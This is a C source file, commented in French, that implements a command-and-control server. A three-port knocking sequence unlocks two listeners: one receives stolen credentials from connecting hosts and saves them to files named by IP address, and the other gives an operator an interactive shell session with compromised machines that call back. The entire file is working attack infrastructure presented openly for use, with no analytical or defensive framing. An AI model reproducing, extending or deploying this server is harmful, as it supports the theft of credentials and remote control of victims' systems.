#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define KNOCK_PORT1 5432
#define KNOCK_PORT2 5543
#define KNOCK_PORT3 5554

#define CREDS_PORT  5555
#define SHELL_PORT  6666

#define BUFFER_SIZE 4096

// Variables pour le knocking et ouvre les port un fois la séquence validée
static int knockStep = 0;
static char expectedIP[INET_ADDRSTRLEN] = {0};
pthread_mutex_t knock_lock = PTHREAD_MUTEX_INITIALIZER;
static int ports_opened = 0; 


// écoute sur un port et gère la séquence de port knocking

void *knock_listener(void *arg) {
    int port = *(int*)arg;
    free(arg);

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(server_fd < 0) {
        perror("socket");
        pthread_exit(NULL);
    }
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in srv_addr, cli_addr;
    socklen_t cli_len = sizeof(cli_addr);
    memset(&srv_addr, 0, sizeof(srv_addr));
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(port);
    srv_addr.sin_addr.s_addr = INADDR_ANY;

    if(bind(server_fd, (struct sockaddr*)&srv_addr, sizeof(srv_addr)) < 0) {
        perror("bind");
        close(server_fd);
        pthread_exit(NULL);
    }
    if(listen(server_fd, 5) < 0) {
        perror("listen");
        close(server_fd);
        pthread_exit(NULL);
    }

    printf("[Knock] Listening on port %d...\n", port);

    while(1) {
        int client_fd = accept(server_fd, (struct sockaddr*)&cli_addr, &cli_len);
        if(client_fd < 0) {
            perror("accept");
            continue;
        }

        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &cli_addr.sin_addr, ip, INET_ADDRSTRLEN);
        printf("[Knock] Connection from %s on port %d\n", ip, port);

        pthread_mutex_lock(&knock_lock);
        if(knockStep == 0 && port == KNOCK_PORT1) {
            knockStep = 1;
            strncpy(expectedIP, ip, INET_ADDRSTRLEN - 1);
            printf("[Knock] 1/3 réussi. IP: %s\n", ip);
        }
        else if(knockStep == 1 && port == KNOCK_PORT2) {
            if(strcmp(ip, expectedIP) == 0) {
                knockStep = 2;
                printf("[Knock] 2/3 réussi. IP: %s\n", ip);
            } else {
                knockStep = 0;
                printf("[Knock] Mauvaise IP => reset.\n");
            }
        }
        else if(knockStep == 2 && port == KNOCK_PORT3) {
            if(strcmp(ip, expectedIP) == 0) {
                knockStep = 3;
                printf("[Knock] 3/3 réussi. Séquence validée!\n");
                ports_opened = 1;
            } else {
                knockStep = 0;
                printf("[Knock] Mauvaise IP => reset.\n");
            }
        }
        else {
            knockStep = 0;
            printf("[Knock] Mauvais ordre => reset.\n");
        }
        pthread_mutex_unlock(&knock_lock);
        close(client_fd);
    }

    close(server_fd);
    pthread_exit(NULL);
}

//Thread pour réceptionner les credentials sur le port désigné

void *creds_server(void *arg) {
    (void)arg;

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(server_fd < 0) {
        perror("[creds] socket");
        pthread_exit(NULL);
    }
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in srv_addr, cli_addr;
    socklen_t cli_len = sizeof(cli_addr);
    memset(&srv_addr, 0, sizeof(srv_addr));
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(CREDS_PORT);
    srv_addr.sin_addr.s_addr = INADDR_ANY;

    if(bind(server_fd, (struct sockaddr*)&srv_addr, sizeof(srv_addr)) < 0) {
        perror("[creds] bind");
        close(server_fd);
        pthread_exit(NULL);
    }
    if(listen(server_fd, 5) < 0) {
        perror("[creds] listen");
        close(server_fd);
        pthread_exit(NULL);
    }

    printf("[Credentials] Thread ready on port %d \n", CREDS_PORT);

    while(!ports_opened) {
        sleep(1);
    }
    printf("[Credentials] Ports opened,  accepting on %d...\n", CREDS_PORT);

    while(1) {
        int client_fd = accept(server_fd, (struct sockaddr*)&cli_addr, &cli_len);
        if(client_fd < 0) {
            perror("[creds] accept");
            continue;
        }
        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &cli_addr.sin_addr, ip, INET_ADDRSTRLEN);
        printf("[Credentials] Connexion depuis %s\n", ip);

        char filename[128];
        snprintf(filename, sizeof(filename), "credentials_%s.txt", ip);
        FILE *f = fopen(filename, "w");
        if(!f) {
            perror("[creds] fopen");
            close(client_fd);
            continue;
        }
        printf("[Credentials] Enregistrement dans %s\n", filename);

        char buffer[BUFFER_SIZE];
        ssize_t bytes;
        while((bytes = recv(client_fd, buffer, sizeof(buffer), 0)) > 0) {
            fwrite(buffer, 1, bytes, f);
        }
        fclose(f);
        if(bytes < 0) {
            perror("[creds] recv");
        } else {
            printf("[Credentials] Fichier %s reçu.\n", filename);
        }
        close(client_fd);
    }

    close(server_fd);
    pthread_exit(NULL);
}

// Thread pour le mini-serveur "shell" sur le port désigné

void *shell_server(void *arg) {
    (void)arg;

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("[Shell] socket");
        pthread_exit(NULL);
    }
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in srv_addr;
    memset(&srv_addr, 0, sizeof(srv_addr));
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(SHELL_PORT);
    srv_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (struct sockaddr*)&srv_addr, sizeof(srv_addr)) < 0) {
        perror("[Shell] bind");
        close(server_fd);
        pthread_exit(NULL);
    }
    if (listen(server_fd, 5) < 0) {
        perror("[Shell] listen");
        close(server_fd);
        pthread_exit(NULL);
    }

    printf("[Shell] Thread ready on port %d \n", SHELL_PORT);

    while (!ports_opened) {
        sleep(1);
    }
    printf("[Shell] Ports opened, accepting on %d \n", SHELL_PORT);

    while (1) {
        struct sockaddr_in cli_addr;
        socklen_t cli_len = sizeof(cli_addr);
        int client_fd = accept(server_fd, (struct sockaddr*)&cli_addr, &cli_len);
        if (client_fd < 0) {
            perror("[Shell] accept");
            continue;
        }

        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &cli_addr.sin_addr, ip, INET_ADDRSTRLEN);
        printf("[Shell] Connexion depuis %s\n", ip);

        pid_t pid = fork();
        if (pid < 0) {
            perror("[Shell] fork");
            close(client_fd);
            continue;
        }
        if (pid == 0) {
            close(server_fd);
            printf("[Shell-child] Interactive session started with %s. Type commands here.\n", ip);
            setbuf(stdin, NULL);

            while (1) {
                fd_set fds;
                FD_ZERO(&fds);
                FD_SET(client_fd, &fds);
                FD_SET(STDIN_FILENO, &fds);
                int maxfd = (client_fd > STDIN_FILENO) ? client_fd : STDIN_FILENO;
                int ret = select(maxfd + 1, &fds, NULL, NULL, NULL);
                if (ret < 0) {
                    perror("[Shell-child] select");
                    break;
                }
                if (FD_ISSET(client_fd, &fds)) {
                    char buffer[1024];
                    ssize_t n = recv(client_fd, buffer, sizeof(buffer), 0);
                    if (n <= 0)
                        break;
                    write(STDOUT_FILENO, buffer, n);
                }
                if (FD_ISSET(STDIN_FILENO, &fds)) {
                    char buffer[1024];
                    ssize_t n = read(STDIN_FILENO, buffer, sizeof(buffer));
                    if (n <= 0)
                        break;
                    send(client_fd, buffer, n, 0);
                }
            }
            printf("[Shell-child] Session ended with %s\n", ip);
            close(client_fd);
            _exit(0);
        } else {
            close(client_fd);
        }
    }

    close(server_fd);
    pthread_exit(NULL);
}

// Lancement des threads

int main() {
    printf("[Main] Lancement du C2 .\n");

    pthread_t tkn1, tkn2, tkn3;
    int *p1 = malloc(sizeof(int)); *p1 = KNOCK_PORT1;
    int *p2 = malloc(sizeof(int)); *p2 = KNOCK_PORT2;
    int *p3 = malloc(sizeof(int)); *p3 = KNOCK_PORT3;
    pthread_create(&tkn1, NULL, knock_listener, p1);
    pthread_create(&tkn2, NULL, knock_listener, p2);
    pthread_create(&tkn3, NULL, knock_listener, p3);

    pthread_t tcreds;
    pthread_create(&tcreds, NULL, creds_server, NULL);

    pthread_t tshell;
    pthread_create(&tshell, NULL, shell_server, NULL);


    while (1) {
        sleep(999999);
    }

    return 0;
}

